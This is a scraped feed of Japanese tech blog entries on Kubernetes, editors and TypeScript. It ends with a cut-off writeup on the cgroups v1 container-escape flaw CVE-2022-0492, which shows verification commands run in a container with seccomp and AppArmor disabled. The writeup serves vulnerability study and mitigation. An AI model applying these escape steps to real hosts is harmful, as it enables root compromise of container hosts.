にエイリアスしたい場合は以下のように行を追加します。apiVersion: v1kind: ConfigMapmetadata:  name: cor...","isoDate":"2022-10-28T10:45:26.000Z","dateMiliSeconds":1666953926000,"authorName":"toshikish","authorId":"toshikish"},{"title":"Luaフィルタで表現力を手に入れろ","link":"https://blog.atusy.net/2022/10/22/lua-filter-for-r-users/","contentSnippet":"作例と共にLuaフィルタとLuaの文法について紹介。Tokyo.R 102の資料で主にRユーザーを対象としているが、Pandocユーザーにも参考になるはず。","isoDate":"2022-10-22T00:00:00.000Z","dateMiliSeconds":1666396800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"controller-runtime Deep Dive","link":"https://speakerdeck.com/bells17/controller-runtime-deep-dive","contentSnippet":"Kubernetes Meetup Tokyo #53 ( https://k8sjp.connpass.com/event/259350/ ) のセッション資料です。\\rcontroller-runtimeのアーキテクチャや内部実装について解説しています。\\r\\rセッション動画はこちらです。\\rhttps://youtu.be/jCyt993dzaU\\r\\r以下スライドで紹介しているリンク:\\r\\rcontroller-runtime clientについて: https://zenn.dev/bells17/articles/controller-runtime-client \\rcontroller-runtime: https://github.com/kubernetes-sigs/controller-runtime/tree/v0.12.3 \\raws-load-balancer-controller: https://github.com/kubernetes-sigs/aws-load-balancer-controller/tree/v2.4.4 \\rkueue: https://github.com/kubernetes-sigs/kueue/tree/v0.2.1\\rKubebuilder Book: https://book.kubebuilder.io/architecture.html \\rつくって学ぶKubebuilder: https://zoetrope.github.io/kubebuilder-training/ \\rGinkgo/GomegaによるKubernetes Operatorのテスト手法: https://zenn.dev/zoetro/books/testing-kubernetes-operator \\rCaching Unstructured Objects using controller-runtime: https://ymmt2005.hatenablog.com/entry/2021/07/25/Caching_Unstructured_Objects_using_controller-runtime \\rkubebuilder-declarative-pattern: https://github.com/kubernetes-sigs/kubebuilder-declarative-pattern \\rkubebuilder: https://github.com/kubernetes-sigs/kubebuilder \\rcontroller-tools: https://github.com/kubernetes-sigs/controller-tools \\r\\raws-load-balancer-controller(Ingress Controller for AWS): https://github.com/kubernetes-sigs/aws-load-balancer-controller \\rkueue(Job Queueing): https://github.com/kubernetes-sigs/kueue \\rtopolvm(CSI Driver for LVM): https://github.com/topolvm/topolvm \\rmoco(MySQL Operator): https://github.com/cybozu-go/moco \\rlogging-operator: https://github.com/banzaicloud/logging-operator \\ristio(Service Mesh): https://github.com/istio/istio","isoDate":"2022-10-06T04:00:00.000Z","dateMiliSeconds":1665028800000,"authorName":"bells17","authorId":"bells17"},{"title":"Istio のサービスへの接続でプロトコルエラーになる","link":"https://zenn.dev/toshikish/articles/d0dd54ae067bed","contentSnippet":"現象Istio サービスメッシュを有効にした Kubernetes クラスタ内に立てた Service に接続しようとするも，upstream connect error or disconnect/reset before headers. reset reason: protocol error が出て到達できない。例えば，以下のような Service に gRPC で接続しようとしても失敗する。apiVersion: v1kind: Servicemetadata:  name: my-servicespec:  selector:    app.kubern...","isoDate":"2022-10-04T02:55:06.000Z","dateMiliSeconds":1664852106000,"authorName":"toshikish","authorId":"toshikish"},{"title":"SQL*Loaderで複数の文字コードが混ざったデータをロードする","link":"https://zenn.dev/nnaka2992/articles/load_complex_characterset_oracle","contentSnippet":"SQL*Loaderで複数の文字コードが混ざったデータをロードする 概要単一のテキストファイル内で特定のカラムのみ文字コードが違うファイルをSQL*Loaderでデータベースに取り込む方法 注意本記事で扱っている対処方法はおそらく紛れ込んだ文字コードが本来あるべき文字コードの一部として解釈できない場合使用できないと思います。(未検証)最低限文字化けしながらも読み込める状態を想定しています。 結論コントロールファイル内で文字コードの変換が必要なカラムに以下の関数を適用する。column \\"CONVERT(:column, \'target_charset\', \'s...","isoDate":"2022-09-25T14:48:29.000Z","dateMiliSeconds":1664117309000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"[2022/09/02] #kubenews 今週のKubernetes + Cloud Native + その他ニュース","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20220902","contentSnippet":"#kubenewsの2022年09月2日の回で話す、@bells17が今週気になったニュース記事をまとめたものです自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってますこの記事自体はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です配信URL:https://youtu.be/r2YsmQFcv-o 告知とかニュースっぽいもの controller-runtime clientについてhttps://zenn....","isoDate":"2022-09-02T13:01:11.000Z","dateMiliSeconds":1662123671000,"authorName":"bells17","authorId":"bells17"},{"title":"Visual Studio Codeで使えるリモート環境のdevcontainerが意外と便利そうだったのでまとめ","link":"https://zenn.dev/bells17/articles/remote-ssh-devcontainer","contentSnippet":"試してたらたまたまVisual Studio Code(vscode)のdevcontainer(Remote Container)が、Remote SSH経由でリモート環境でも使えることを知ったので、devcontainer用の環境構築方法やdevcontainerの構築方法についてまとめてみた今まではローカル環境のdockerか、codespaceでしか利用できないのかなと思っていたのだけど、リモート含めて利用できるとかなり便利そうな印象だったので一通り試してみました最近はRemote SSHでリモート環境を利用するケースが多いのでリモート環境で使えないならそんなに使えないかなと...","isoDate":"2022-09-01T18:16:25.000Z","dateMiliSeconds":1662056185000,"authorName":"bells17","authorId":"bells17"},{"title":"controller-runtime clientについて","link":"https://zenn.dev/bells17/articles/controller-runtime-client","contentSnippet":"KubernetesでOperatorやControllerを開発する際に利用するフレームワークであるcontroller-runtimeのclientについて調べたのでまとめます。この記事の目的は以下のような感じになります:controller-runtimeが提供するKubernetes clientの概要についてまとめることcontroller-runtime client周りの追加の不明点などがあった場合には、この記事をベースにコードベースで調べたいことをすぐに調べられる程度にはコードレベルで詳しい内容をまとめること以下についてわかるようになること各種内部clien...","isoDate":"2022-08-27T09:30:47.000Z","dateMiliSeconds":1661592647000,"authorName":"bells17","authorId":"bells17"},{"title":"Software Design 2022年9月号にコードリーディングに関する記事を寄稿しました","link":"https://bells17.medium.com/oss-source-code-reading-29392edf80fe?source=rss-713cf42ce34d------2","isoDate":"2022-08-18T15:06:54.000Z","dateMiliSeconds":1660835214000,"authorName":"bells17","authorId":"bells17"},{"title":"felpパッケージでRのヘルプをあいまいに検索しよう","link":"https://blog.atusy.net/2022/08/13/felp-fuzzyhelp/","contentSnippet":"Rでヘルプを見ようにも記憶があいまいだったり、つづりがあやふやで調べようがない経験があるかもしれません。tidyverseに入ってるなんちゃらパッケージのミュータントみたいな関数、なんだっけ？geom_limeとかgeom_pintってライムもビールも欲しいけどそうやないんや！1そこで、あいまいな（fuzzy）キーワードでヘルプを検索するfuzzyhelp関数をfelpパッケージに追加しました。","isoDate":"2022-08-13T00:00:00.000Z","dateMiliSeconds":1660348800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"React.FCをやめる必要はない","link":"https://zenn.dev/kimitsu/articles/lets-use-react-fc","contentSnippet":"React や TypeScript に限らず、明示的に型をつけた方が良いという主張です。帰結として React.FC をやめる必要はないと思います。 なぜ明示的に型を付けた方が良いのか 理由 1: コードが少しだけ分かりづらくなる型推論をコンパイラに任せたコードは書くのが楽で見た目もスッキリします。一方で読み手の人間の負担は少しだけ増えます。ソースコードに書かれていない情報を読み取る必要が出るからです。最近のエディタ / IDE はマウスホバーで型情報を表示してくれますね。しかし例えば GitHub 上で PR を見ているときは違います。型を確認するにはコードの別...","isoDate":"2022-08-08T07:05:21.000Z","dateMiliSeconds":1659942321000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"Vim/NeovimのCTRL_GをPrefixにしてみる","link":"https://blog.atusy.net/2022/08/08/ctrlg-as-prefix-vim/","contentSnippet":"CTRL_Gの機能はステータスラインで賄えるのでGit用のPrefixにしてみました","isoDate":"2022-08-08T00:00:00.000Z","dateMiliSeconds":1659916800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Fuzzy Finderで捗るFernによるファイル操作","link":"https://blog.atusy.net/2022/08/05/fuzzyfern/","contentSnippet":"FernはVim/Neovim向けのファイラーで、外部依存がなくパフォーマンスも良好なので、好んで使っています。また、ファイラーらしく、ファイル操作などの機能を種々揃えており、「action」と呼んでいます。Fernの画面上でaを押すと、コマンドラインモードでアクションを指定でき、設定してあればタブ補完も効くようです。作者は、ユーザーがキーマッピングを覚えなくて良い点を魅力に挙げています。","isoDate":"2022-08-05T00:00:00.000Z","dateMiliSeconds":1659657600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Security Command Center \xd7 PagerDuty 自動アラート通知の取り組み","link":"https://speakerdeck.com/kyohmizu/security-command-center-x-pagerduty-zi-dong-aratotong-zhi-falsequ-rizu-mi","contentSnippet":"3-shake SRE Tech Talk #4 の登壇資料です。\\rhttps://3-shake.connpass.com/event/253028/","isoDate":"2022-08-04T04:00:00.000Z","dateMiliSeconds":1659585600000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"SRETT#4黒い画面をもっと効率的に(使って自動化の時間を捻出)","link":"https://speakerdeck.com/masasuzu/srett-number-4hei-ihua-mian-womotutoxiao-lu-de-ni-shi-tutezi-dong-hua-falseshi-jian-wonian-chu","contentSnippet":"","isoDate":"2022-08-04T04:00:00.000Z","dateMiliSeconds":1659585600000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"nvim-treehopperで捗るコードの折り畳み","link":"https://blog.atusy.net/2022/08/01/treehopper/","contentSnippet":"nvim-treehopperを使うと、ソースコードの抽象構文木に基づいた範囲選択が簡単にできます。関数定義全体を選択とか、if文の条件部分を選択とか、文脈に沿った範囲選択が捗るわけです。おそらく、定番の使い道は選択範囲の削除（d | D)やヤンク（y | Y）でしょう。加えてコードの折り畳み（zf）とも相性が良いとに気付きました。","isoDate":"2022-08-01T00:00:00.000Z","dateMiliSeconds":1659312000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"chowcho.nvimで任意の関数を、対話的に選択したwindowで実行","link":"https://blog.atusy.net/2022/07/31/chowcho-nvim-any-func/","contentSnippet":"chowcho.nvimを使うと、Neovimの各windowに番号が表示され、目的番号を入力すると、フォーカスを移動できます。https://github.com/tkmpypy/chowcho.nvim今回、この機能を一般化し、winidを受け取る任意の関数を実行できるようにしました。","isoDate":"2022-07-31T00:00:00.000Z","dateMiliSeconds":1659225600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Union typesに対してPickやOmitをしたい時","link":"https://zenn.dev/kimitsu/articles/48dc59129c5569","contentSnippet":"タイトルの通りです。普通（？）のオブジェクト型に対して一部のプロパティを取り出したり削除したりしたい時にはPickやOmitを使いますね。ただPickとOmitはUnion typesに対して分配的には効きません（後述）。そこでUnion typesに対して分配的にPickやOmitをする方法を考えていきます。実際に作ろうと思ったときと同じ手順で説明していくので、これからGeneric typesを書いていきたい方の参考にもなればと思います。 結論// 補助的な型type KeyOfUnion<T> = T extends T ? keyof T : neve...","isoDate":"2022-07-18T12:58:36.000Z","dateMiliSeconds":1658149116000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"[2022/07/015] #kubenews 今週のKubernetes + Cloud Native + その他ニュース","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20220715","contentSnippet":"#kubenewsの2022年07月15日の回で話す、@bells17が今週気になったニュース記事をまとめたものです自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってますこの記事自体はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です配信URL:https://youtu.be/ar1_fxX601E 告知とかニュースっぽいもの 『Linuxで動かしながら学ぶTCP/IPネットワーク入門』でネットワークの勉強をし...","isoDate":"2022-07-15T07:31:08.000Z","dateMiliSeconds":1657870268000,"authorName":"bells17","authorId":"bells17"},{"title":"サイバー攻撃から Kubernetes クラスタを守るための効果的なセキュリティ対策","link":"https://speakerdeck.com/kyohmizu/saibagong-ji-kara-kubernetes-kurasutawoshou-rutamefalsexiao-guo-de-nasekiyuriteidui-ce","contentSnippet":"CloudNative Security Conference 2022 プレイベント の登壇資料です。\\rhttps://cloudnativedays.connpass.com/event/252961/","isoDate":"2022-07-12T04:00:00.000Z","dateMiliSeconds":1657598400000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"[2022/07/01] #kubenews 今週のKubernetes + Cloud Native + その他ニュース","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20220701","contentSnippet":"#kubenewsの2022年07月01日の回で話す、@bells17が今週気になったニュース記事をまとめたものです自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってますこの記事自体はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です配信URL:https://youtu.be/R7VHtaBZFkQ 告知とかニュースっぽいもの Kubernetes Novice Tokyo #20にてKueueのセッションを行...","isoDate":"2022-07-01T11:14:01.000Z","dateMiliSeconds":1656674041000,"authorName":"bells17","authorId":"bells17"},{"title":"AWS SAP 合格体験記 2022/06","link":"https://zenn.dev/tayusa/articles/7b3dd99a79403c","contentSnippet":"はじめにネットで公開されている数々のAWS Certified Solutions Architect - Professionalの合格体験記や勉強法などにお世話になったので自分も書いてみることにしました。教材選びや学習スケジュールの参考になれば嬉しいです。 私の前提知識まず、本題に入る前に私のSAPを受ける前までのスキルセットを軽く紹介させてください。業務でのAWS歴は8ヶ月ほどで現在SREとして働いています以前はRuby on Railsなどを書くプログラマーをやっていましたAWS SAAは2022/03に取得しましたAWSではない他のIT資格は以下で...","isoDate":"2022-06-24T00:36:49.000Z","dateMiliSeconds":1656031009000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"Lexicalでシンタックスハイライトする","link":"https://zenn.dev/kimitsu/articles/440143e94af670","contentSnippet":"LexicalはDraft.jsの後継となるテキストエディタフレームワークです。元々Metaで開発されていたものがOSSとして公開されました。https://github.com/facebook/lexicalLexicalは主にリッチテキストを実装するためのフレームワークですが、高度に抽象化されているためソースコードエディタを実装するのにも利用できます。ただコードに関するモジュールである@lexical/codeはドキュメントが虚無なため、本記事で使い方の紹介ができればと思います。https://lexical.dev/docs/api/lexical-code @...","isoDate":"2022-06-19T13:45:37.000Z","dateMiliSeconds":1655646337000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"istio-proxyがどのように通信を仲介しているかを知る","link":"https://zenn.dev/tayusa/articles/aa54bbff3d0d2d","contentSnippet":"目的前回、書いた記事で素のKubernetesのネットワークについて少し理解できたのですが、Istioを入れた場合はEnvoyが通信を仲介するのでその仕組みを知りたく調べてみましたhttps://zenn.dev/tayusa/articles/c705cd65b6ee74 環境OS: Arch Linux(5.17.9-arch1-1)k8sの環境: kindhttps://kind.sigs.k8s.io/version 0.14.0デフォルトのk8sのバージョンは1.24 クラスタのセットアップ kindでクラスタ作成https:...","isoDate":"2022-06-03T18:42:53.000Z","dateMiliSeconds":1654281773000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"asdf のバージョン アップがうまくいかなかった","link":"https://zenn.dev/kyohei_saito/articles/40a13800f34d5f","contentSnippet":"最近、転職により業務環境が Windows から Mac に変わったことで、ツール類のバージョン管理として asdf を使用しはじめました。asdf 自体のバージョンアップがうまくいかない事象に直面したため、解決方法をメモしておきます。 サマリHomebrew により asdf をバージョンアップしたら、asdf でインストールしたツールが使用できなくなりました。shim ディレクトリ内のスクリプトに記述された asdf のパスが古いバージョンとなっていたことが原因でした。shim ディレクトリを別のディレクトリに移動後、asdf reshim を実行することで shim デ...","isoDate":"2022-05-29T09:36:54.000Z","dateMiliSeconds":1653817014000,"authorName":"Kyohei Saito","authorId":"kiyos"},{"title":"KubernetesのServiceの挙動を確認する","link":"https://zenn.dev/tayusa/articles/c705cd65b6ee74","contentSnippet":"目的普段、Kubernetesを触ってはいるのですが、表面的な使い方しか知らないので動きを確認してみます 環境OS: Arch Linux(5.17.9-arch1-1)k8sの環境: kindhttps://kind.sigs.k8s.io/version 0.14.0デフォルトのk8sのバージョンは1.24 ひとまず、ローカルでクラスタを立てる環境に応じてkindをインストールhttps://kind.sigs.k8s.io/docs/user/quick-start/#installationクラスタの作成$ kind ...","isoDate":"2022-05-28T12:19:47.000Z","dateMiliSeconds":1653740387000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"DenoとTypeScriptで自作CLIツールのghfを移植してみた（動機編）","link":"https://blog.atusy.net/2022/05/27/deno-ghf/","contentSnippet":"以前、ghコマンドを曖昧検索で便利にするghfコマンドを作りました。GitHub CLI（gh）に曖昧検索の力を加えるghfコマンドを作ってzshプラグイン化した","isoDate":"2022-05-27T00:00:00.000Z","dateMiliSeconds":1653609600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Python Experiment: For VS Comprehension 1","link":"https://daisuke1024akagawa.medium.com/python-experiment-for-vs-comprehension-1-28868928fe8d?source=rss-c54ac439ad2b------2","isoDate":"2022-05-26T14:21:48.000Z","dateMiliSeconds":1653574908000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"Kueueアーキテクチャ/Kueue Architecture","link":"https://speakerdeck.com/bells17/kueue-architecture","contentSnippet":"参考リンク一覧:\\rコードリーディングメモ: https://zenn.dev/bells17/scraps/16625963e51d23 \\r動作確認用manifests: https://github.com/bells17/tmp/tree/main/kueue-example \\rリポジトリ: https://github.com/kubernetes-sigs/kueue/tree/v0.1.0\\rDesign Docs(controller): https://bit.ly/kueue-controller-design \\rDesign Docs(API): https://bit.ly/kueue-apis \\rOld  Proposal: https://bit.ly/k8s-job-management \\r\\r---\\r\\rhttps://youtu.be/CFUfw3cMNI8?t=724\\rにてこのスライドを使ったKueueの解説セッションを行いましたので動画で見たい方はこちらでどうぞ","isoDate":"2022-05-24T04:00:00.000Z","dateMiliSeconds":1653364800000,"authorName":"bells17","authorId":"bells17"},{"title":"Goで立てたWebサーバーでソケットを学ぶ","link":"https://zenn.dev/tayusa/articles/077d911b357a92","contentSnippet":"目的TCPなどにまるで明るくないので、学習のために調べてみました 環境Arch Linux(5.17.9-arch1-1)go version go1.18.3 linux/amd64 やることGoで書いたWebサーバーを動かして挙動を確認したり、少しコードを見てみますコードは以下ですpackage mainimport (\\t\\"fmt\\"\\t\\"log\\"\\t\\"net/http\\"\\t\\"time\\")func main() {\\thttp.HandleFunc(\\"/\\", func(w http.ResponseWriter, r *http.Request)...","isoDate":"2022-05-22T12:32:11.000Z","dateMiliSeconds":1653222731000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"Neovimのカラースキームを編集中のバッファのファイルパスに応じて変える","link":"https://blog.atusy.net/2022/04/28/vim-colorscheme-by-buffer/","contentSnippet":"Vim/NeovimでLSPを利用して関数などの定義を参照すると、気付いたら標準ライブラリなどを参照している、なんて場面があります。どこまで実装を追いたいかは人それぞれとは言え、作業ディレクトリの内外どちらのファイルを参照しているかはすぐに気付ける方がいいでしょう。","isoDate":"2022-04-28T00:00:00.000Z","dateMiliSeconds":1651104000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"zennの執筆環境向けdevcontainerを作成した話","link":"https://zenn.dev/bells17/articles/zenn-devcontainer","contentSnippet":"タイトルまんまでzennの執筆環境向けdevcontainerを作成したという話です前々からzennの記事はGithub repositoryと連携して書いており、codespaceにvscodeから接続して執筆してたのですが、zenn-cliを使ったプレビューが可能らしいということを最近知ったので、devcontainerの勉強がてらサクッとプレビューが可能な環境を作りましたという内容になります作ったdevcontainerのリポジトリはこちらですhttps://github.com/bells17/zenn-template 使い方READMEに書いてある通りですが、te...","isoDate":"2022-04-17T15:27:41.000Z","dateMiliSeconds":1650209261000,"authorName":"bells17","authorId":"bells17"},{"title":"[2022/04/15] 今週のKubernetes + Cloud Native + その他ニュース","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20220415","contentSnippet":"普段は#kubenewsの2022年04月15日の回で話す、@bells17が今週気になったニュース記事をまとめたものです。自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってます。あと記事はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です。配信URL:https://youtu.be/j76uphcYs2E 告知とかニュースっぽいもの Kubernetes Meetup TokyoでLTする予定ですhttps...","isoDate":"2022-04-15T12:50:24.000Z","dateMiliSeconds":1650027024000,"authorName":"bells17","authorId":"bells17"},{"title":"吉祥寺.pm29で久しぶりにLTしてきました #kichijojipm","link":"https://blog.masasuzu.net/entry/2022/04/15/202342","contentSnippet":"kichijojipm.connpass.com久しぶりにLTしてきました。久しぶりに外で発表したいなと思いつつ、だいぶブランクあるのでちょうどいいリハビリできるところがないかな。— masasuzu (@masasuz) 2022年4月9日  こんなこと考えてたら良いタイミングできちぴーが開催されるので、LT申し込んでみました。#kichijojipm 7年ぶりにLTしたので緊張した。というのと、前回の発表調べて7年前もきちぴーあったのかという驚きもあった。— masasuzu (@masasuz) 2022年4月12日  どうやら7年ぶりだったみたいです。タイミング的に最終出社日の翌日だったので、キャリアの話をしました。diary.masasuzu.net正直、LTにおさまる量じゃなかったのは反省点です。資料ももうちょっとなんとかできたかなあという気持ちがあります。少しずつ登壇回数増やして、勘を取り戻していきたいところ。","isoDate":"2022-04-15T11:23:42.000Z","dateMiliSeconds":1650021822000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"2022-04-12 吉祥寺.pm 29","link":"https://speakerdeck.com/masasuzu/2022-04-12-ji-xiang-si-dot-pm-29","contentSnippet":"","isoDate":"2022-04-12T04:00:00.000Z","dateMiliSeconds":1649736000000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"CVE-2022-0492 調査まとめ","link":"https://kyohmizu.hatenablog.com/entry/2022/04/06/233150","contentSnippet":"cgroups v1 の脆弱性 CVE-2022-0492 について、調査した内容をまとめました。イベントで発表した内容ですが、時間の都合で語りきれなかった部分も多く、内容を加筆してブログに書くことにしました。 speakerdeck.comCVE-2022-0492 概要release_agent についてエクスプロイト前提条件要点検証修正パッチコンテナセキュリティseccompAppArmor (SELinux)Kubernetes の場合EKS, GKE の場合さいごに参考リンクCVE-2022-0492LinuxコンテナセキュリティCVE-2022-0492 概要CVE-2022-0492 は cgroups v1 における特権昇格・コンテナブレイクアウトの脆弱性です。cgroups v1 の release_agent 機能を悪用することで、コンテナからホストの root 権限で任意コマンド実行が可能となります。詳細は後述しますが、これは本来特権コンテナに限定されるべき設定が、capabilities のチェック漏れにより非特権コンテナから行える状態だったことが原因です。本脆弱性は seccomp や AppArmor/SELinux を有効にすることで回避可能です。release_agent についてcgroups v1 は cpu, memory, pids のようにリソースをサブシステムに分割し、各サブシステムがディレクトリ構造を取っています。# ls /sys/fs/cgroup/blkio  cpu,cpuacct  cpuset   freezer  memory  net_cls           net_prio    pids  systemdcpu    cpuacct      devices  hugetlb  misc    net_cls,net_prio  perf_event  rdma  unifiedrelease_agent は各 cgroup サブシステムのルートディレクトリに配置されるファイルで、cgroup 内のプロセスが終了する時に起動させるプログラムを設定します。リリースエージェントプログラム の起動の有無は、cgroup ディレクトリ内の notify_on_release の値で判断されます。このファイルはルート以下、各 child cgroup のディレクトリにも配置されています。notify_on_release = 1 の場合、リリースエージェントプログラムを起動します。cgroup のディレクトリ構成pids cgroup のルートディレクトリを見ると、以下のように release_agent, notify_on_release のファイルを確認できます。# ls /sys/fs/cgroup/pids/cgroup.clone_children  cgroup.sane_behavior  docker      notify_on_release  system.slice  user.slicecgroup.procs           default               init.scope  release_agent      tasks# cat /sys/fs/cgroup/pids/release_agent   ← 空のファイル# cat /sys/fs/cgroup/pids/notify_on_release 0ちなみにコンテナに CAP_SYS_ADMIN がある場合、release_agent を使えば本脆弱性を利用することなくブレイクアウト可能です。https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)また cgroups v2 には release_agent がなく、リリースの通知は別の仕組みを使っています。エクスプロイト前提条件本脆弱性は次の条件を全て満たす場合に影響があります。root ユーザーまたは、no_new_privsフラグなしでコンテナを起動しているseccomp, AppArmor/SELinux がいずれも有効でないホストの非特権ユーザー名前空間が有効（ubuntu ではデフォルトの設定です）各設定の確認方法↓# cat /proc/sys/kernel/unprivileged_userns_clone   ← 非特権ユーザ名前空間1# cat /proc/self/status | grep Seccomp   ← seccompSeccomp:    0Seccomp_filters:    0# cat /proc/self/attr/current   ← AppArmordocker-default (enforce)要点コンテナから cgroups の release_agent に書き込みたいrdma サブシステムは root cgroup に所属しているが、readonly でマウントされているcgroup を rw で新たにマウントしたいが、マウントには CAP_SYS_ADMIN が必要unshare で user namespace (ns) を作成すれば CAP_SYS_ADMIN が得られるcgroup, mount ns も同時に作成することで cgroup をマウント可能にrdma cgroup をマウント すると release_agent に書き込み可能cgroup 内のプロセスが終了するタイミングで、任意のプログラムをホストの root 権限で実行検証脆弱な Kernel バージョンで CVE-2022-0492 を検証します。インスタンスに用意した ubuntu 上で、seccomp, AppArmor をオフにした docker コンテナを起動します。# uname -aLinux ip-172-31-1-29 5.13.0-1017-aws #19~20.04.1-Ubuntu SMP Mon Mar 7 12:53:12 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux# docker run --rm -it --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu bashdocker はコンテナ作成時に cgroup ns を作成しないので、コンテナはホストと同じ cgroup ns に所属しています。自身の cgroup を確認すれば root cgroup からのパスがわかるため、コンテナ内から各サブシステムが root cgroup に所属しているかどうか調べることができます。root@ab988587a245:/# cat /proc/self/cgroup13:misc:/12:rdma:/   ← rdma サブシステムは root cgroup11:hugetlb:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a10:cpuset:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a9:net_cls,net_prio:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a8:perf_event:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a7:blkio:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a6:devices:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a5:freezer:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a4:cpu,cpuacct:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a3:pids:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a2:memory:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a1:name=systemd:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a0::/system.slice/containerd.serviceこれで rdma サブシステムが root cgroup に所属していることがわかりました。root@ab988587a245:/# mount | grep \'cgroup (ro\'cgroup on /sys/fs/cgroup/systemd type cgroup (ro,nosuid,nodev,noexec,relatime,xattr,name=systemd)cgroup on /sys/fs/cgroup/memory type cgroup (ro,nosuid,nodev,noexec,relatime,memory)cgroup on /sys/fs/cgroup/pids type cgroup (ro,nosuid,nodev,noexec,relatime,pids)cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (ro,nosuid,nodev,noexec,relatime,cpu,cpuacct)cgroup on /sys/fs/cgroup/freezer type cgroup (ro,nosuid,nodev,noexec,relatime,freezer)cgroup on /sys/fs/cgroup/devices type cgroup (ro,nosuid,nodev,noexec,relatime,devices)cgroup on /sys/fs/cgroup/blkio type cgroup (ro,nosuid,nodev,noexec,relatime,blkio)cgroup on /sys/fs/cgroup/perf_event type cgroup (ro,nosuid,nodev,noexec,relatime,perf_event)cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (ro,nosuid,nodev,noexec,relatime,net_cls,net_prio)cgroup on /sys/fs/cgroup/cpuset type cgroup (ro,nosuid,nodev,noexec,relatime,cpuset)cgroup on /sys/fs/cgroup/hugetlb type cgroup (ro,nosuid,nodev,noexec,relatime,hugetlb)cgroup on /sys/fs/cgroup/rdma type cgroup (ro,nosuid,nodev,noexec,relatime,rdma)   ← readonly でマウントされているcgroup on /sys/fs/cgroup/misc type cgroup (ro,nosuid,nodev,noexec,relatime,misc)root@ab988587a245:/# ls -l /sys/fs/cgroup/rdma/total 0-rw-r--r--  1 root root 0 Mar 15 01:40 cgroup.clone_children-rw-r--r--  1 root root 0 Mar 15 01:40 cgroup.procs-r--r--r--  1 root root 0 Mar 15 01:40 cgroup.sane_behavior-rw-r--r--  1 root root 0 Mar 15 01:40 notify_on_release-rw-r--r--  1 root root 0 Mar 29 16:01 release_agentdrwxr-xr-x 13 root root 0 Mar 26 21:07 system.slice-rw-r--r--  1 root root 0 Mar 15 01:40 tasksroot@ab988587a245:/# echo test > /sys/fs/cgroup/rdma/release_agent bash: /sys/fs/cgroup/rdma/release_agent: Read-only file system   ← 書き込みエラーというわけで、cgroup を rw でマウントできれば良いことになります。ここで capability を確認すると、コンテナは CAP_SYS_ADMIN を持っておらず、このままでは cgroup をマウントする権限がありません。root@ab988587a245:/# apt update && apt install -y libcap2-binroot@ab988587a245:/# cat /proc/self/status | grep CapEffCapEff: 00000000a80425fbroot@ab988587a245:/# capsh --decode=00000000a80425fb0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcaproot@ab988587a245:/# mount -t cgroup -o rdma cgroup /mntmount: /mnt: permission denied.   ← マウントエラーCAP_SYS_ADMIN を付与するため user ns を作成し新たにプロセスを立ち上げます。さらに mount, cgroup ns 